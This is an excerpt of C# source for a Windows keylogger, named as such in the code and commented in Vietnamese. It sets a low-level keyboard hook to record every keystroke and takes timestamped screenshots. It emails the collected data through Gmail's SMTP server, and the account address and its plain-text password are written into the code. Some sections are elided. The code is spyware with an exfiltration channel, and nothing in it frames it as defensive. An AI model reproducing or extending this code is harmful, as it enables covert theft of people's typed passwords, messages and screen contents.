...
namespace KeyLogger
{
    class Program
    {
        ...
        {
            //Lay tat ca cac process dang RUN ở Service
            using (Process curProcess = Process.GetCurrentProcess())
            {
                //Lay process dang RUN ở hien tai
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    //Lay ra ki tu da go WH_KEYBOARD_LL dua tren GetmoduleHandle tu thu hien kernel tren hdh
        ...
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                ...
                //Check key de dong mo cua so
                CheckHotKey(vkCode);
                //Viet ra log Visual Studio de minh có the xem ket qua
                WriteLog(vkCode);
            }
            //Thuc hien Hook tiep
        ...
        static void HookKeyboard()
        {
            ...
            //Application khoi dong cho lan tiep theo
            Application.Run();
        ...
        static void CaptureScreen()
        {
            ...
            string imageName = string.Format("{0}\\{1} {2} {3}", directoryImage, DateTime.Now.ToLongDateString(), DateTime.Now.ToString("HH-mm-ss tt"), imageExtendtion) ;
        ...
        static void SendMail()
        {
            try
            {
                ...
                mail.From = new MailAddress("genzgteam@gmail.com");
                mail.To.Add("genzgteam@gmail.com");
                ...
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("genzgteam@gmail.com", "45655666");
